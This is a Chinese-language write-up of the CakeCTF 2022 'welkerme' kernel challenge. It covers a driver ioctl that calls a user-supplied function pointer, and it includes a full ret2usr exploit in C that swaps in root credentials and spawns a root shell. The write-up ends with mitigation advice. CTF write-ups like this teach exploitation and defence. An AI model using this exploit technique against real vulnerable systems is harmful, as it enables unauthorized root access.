# CakeCTF 2022 welkerme Writeup

## 题目简述

这是一道 Linux 内核提权入门题。虚拟机加载了字符设备 `/dev/welkerme`，驱动提供两个 ioctl：

```c
#define CMD_ECHO 0xc0de0001
#define CMD_EXEC 0xc0de0002
```

其中 `CMD_EXEC` 直接把用户传入的整数转换成内核函数指针并调用：

```c
case CMD_EXEC:
  code = (long (*)(void))(arg);
  return code();
```

QEMU 启动参数关闭了 KASLR 和 KPTI，题目环境也没有阻止内核执行用户空间页面的 SMEP 障碍。攻击者因此可以让内核直接执行用户态函数，即经典的 ret2usr。

## 解题过程

内核提权的目标是以当前进程为对象执行：

```c
commit_creds(prepare_kernel_cred(NULL));
```

`prepare_kernel_cred(NULL)` 创建 root 凭据，`commit_creds` 将它安装到当前进程。由于启动参数含 `nokaslr`，函数地址固定；调试环境中可从 `/proc/kallsyms` 确认与题目内核匹配的地址。

将这两次调用放进用户空间函数，再把函数地址作为 `CMD_EXEC` 参数：

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define CMD_EXEC 0xc0de0002

static int escalate_privilege(void) {
    void (*commit_creds)(void *) =
        (void *)0xffffffff81072540UL;
    void *(*prepare_kernel_cred)(void *) =
        (void *)0xffffffff810726e0UL;

    commit_creds(prepare_kernel_cred(NULL));
    return 31337;
}

int main(void) {
    int fd = open("/dev/welkerme", O_RDWR);
    if (fd < 0) {
        perror("/dev/welkerme");
        return 1;
    }

    ioctl(fd, CMD_EXEC, (unsigned long)escalate_privilege);
    system("/bin/sh");
    close(fd);
    return 0;
}
```

执行路径如下：

```text
用户态 ioctl
  -> 驱动以 ring 0 调用 escalate_privilege
  -> 安装 root cred
  -> 返回原用户进程
  -> /bin/sh 继承 root 身份
```

编译时应使用与虚拟机兼容的静态二进制，上传到 `/tmp` 后运行。提权成功即可读取：

```text
/root/flag.txt
```

得到：

```text
CakeCTF{b4s1cs_0f_pr1v1l3g3_3sc4l4t10n!!}
```

## 方法总结

驱动把完全不可信的用户参数当作内核函数指针调用，相当于直接赠送“在 ring 0 执行用户代码”的原语。关闭 KASLR 使内核符号地址固定，缺少 SMEP 又允许 CPU 从内核态取用户页指令，二者共同把利用缩短为一次 ioctl。

实际驱动绝不能调用未经验证的用户地址。现代内核还应启用 SMEP、SMAP、KASLR 和 KPTI；即使这些缓解措施存在，任意内核函数调用本身仍是必须修复的根本漏洞。
